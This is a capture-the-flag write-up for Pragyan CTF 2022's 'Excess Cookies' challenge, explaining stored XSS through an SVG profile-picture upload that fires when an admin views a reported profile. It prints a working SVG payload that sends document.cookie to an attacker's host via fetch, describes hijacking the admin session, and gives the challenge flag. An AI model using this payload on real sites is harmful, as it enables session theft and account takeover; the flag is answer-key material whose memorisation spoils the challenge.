# Pragyan CTF 2022: Excess Cookies
## Write-Up

1) On noticing the name of this challenge, you will get to know that this is something related to XSS and cookie stealing.

2) On exploring for XSS in each and every user text input field, you wont be able to find any XSS. But remember, XSS not only happens with user input field. It can happens by means of file upload also.

3) So we will get ended up in file upload section for profile pic, where you can able to upload picture as jpg, jpeg, png and also svg file.

4) Now we got a way to do XSS, that is by means of uploading SVG file. Next, our ultimate aim is to steal admin session cookie.

5) How this can be done is that, there is a feature of reporting a user and making admin to visit the reported user profile.

6) By exploiting this feature of admin visiting reported user profile, we need to steal admin cookie.

7) So to do this, we need to upload a SVG file which contains XSS as profile pic. Then on reporting ourself, admin will make a visit to our profile page because of which XSS will get triggered and admin cookie will get stolen.

Sample SVG-XSS payload for cookie stealing is,

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
   <script type="text/javascript">
      fetch('http://<your-public-IP>?c='+document.cookie);
   </script>
</svg>
```

By using the above payload, you will be able to find the ADMIN cookie in the GET request of you hosted server.

8) Then by logging in as ADMIN with the cookie, you will find the flag in one of the post of admin.

The flag is 
```
p_ctf{x33_a4d_svg_m4k3s_b3st_p41r}
```